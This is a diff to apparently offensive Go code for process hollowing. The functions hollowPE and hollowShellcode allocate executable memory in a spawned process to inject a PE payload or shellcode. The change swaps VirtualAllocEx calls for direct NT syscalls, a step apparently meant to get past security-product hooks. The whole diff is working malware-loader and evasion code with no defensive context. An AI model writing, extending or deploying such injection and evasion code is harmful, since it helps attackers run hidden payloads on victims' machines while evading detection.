@@ -166,28 +166,11 @@ func hollowPE(exe string, payload []byte) error {
 		_ = r
 	}
 
-	// ── 6. Allocate in remote process ─────────────────────────────────────
-	var allocBase uintptr
-	// Try preferred base first.
-	allocBase, _, _ = procVirtualAllocEx.Call(
-		uintptr(pi.Process),
-		uintptr(imageBase),
-		uintptr(sizeOfImage),
-		uintptr(memCommit|memReserve),
-		uintptr(pageExecuteReadWrite),
-	)
-	if allocBase == 0 {
-		// Fallback: let OS choose.
-		allocBase, _, _ = procVirtualAllocEx.Call(
-			uintptr(pi.Process),
-			0,
-			uintptr(sizeOfImage),
-			uintptr(memCommit|memReserve),
-			uintptr(pageExecuteReadWrite),
-		)
-	}
-	if allocBase == 0 {
-		return abort("VirtualAllocEx", fmt.Errorf("failed to allocate %d bytes", sizeOfImage))
+	// ── 6. Allocate in remote process via direct NT syscall ───────────────
+	// ntAllocAt tries the preferred image base first, falls back to OS-chosen.
+	allocBase, err := ntAllocAt(pi.Process, uintptr(imageBase), uintptr(sizeOfImage), pageExecuteReadWrite)
+	if err != nil {
+		return abort("NtAllocateVirtualMemory", err)
 	}
 
 	// ── 7. Build staging buffer (local copy) ──────────────────────────────
@@ -310,13 +293,10 @@ func hollowShellcode(exe string, shellcode []byte) error {
 	defer windows.CloseHandle(pi.Thread)
 	defer windows.CloseHandle(pi.Process)
 
-	addr, _, e := procVirtualAllocEx.Call(
-		uintptr(pi.Process), 0, uintptr(len(shellcode)),
-		uintptr(memCommit|memReserve), uintptr(pageExecuteReadWrite),
-	)
-	if addr == 0 {
+	addr, err := ntAlloc(pi.Process, uintptr(len(shellcode)), pageExecuteReadWrite)
+	if err != nil {
 		windows.TerminateProcess(pi.Process, 1)
-		return fmt.Errorf("VirtualAllocEx: %v", e)
+		return err
 	}
 
 	var written uintptr
